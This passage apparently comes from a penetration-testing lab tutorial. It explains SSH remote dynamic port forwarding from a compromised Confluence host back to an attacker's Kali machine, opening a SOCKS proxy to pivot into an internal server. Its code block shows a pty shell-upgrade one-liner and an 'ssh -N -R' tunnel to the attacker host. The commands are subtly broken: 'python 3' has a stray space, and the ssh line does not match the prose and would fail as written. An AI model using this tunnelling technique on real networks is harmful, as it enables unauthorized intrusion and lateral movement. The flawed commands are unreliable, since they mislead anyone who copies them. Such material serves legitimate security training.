The SSH session is initiated by CONFLUENCE01, connecting to the Kali machine, which is running an SSH server. The SOCKS proxy port is bound to the Kali machine on TCP/9998. Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where they will be forwarded based on where they're addressed - in this case, MULTISERVER02.

To demonstrate how useful remote port forwarding can be, let's set up an example in the lab. Once we have a reverse shell from CONFLUENCE01, spawned a TTY shell within it, and have enabled SSH on our Kali machine, we can start crafting the dynamic port forwarding command.

The remote port forwarding command is relatively simple, (slightly confusingly) it uses the -R option as classic remote port forwarding. The difference is that when we want to create a dynamic port forward, pass only one socket: the socket we want to listen on the SSH server. We do not need to specify an IP address, if we just pass a port, it will be bound to the loopback interface of the SSH server by default.

To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply -R 9998 to the SSH command we run on CONFLUENCE01. We'll also pass the -N flag to prevent a shell from being opened.

```
confluence01:/opt/atlas/confluence/bin$ python 3 -c 'import pty; pty.spawn("/bin/bash")'
<in python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence01:/opt/atlas/confluence/bin$ ssh -N -R 9998:192.168.118.4
```
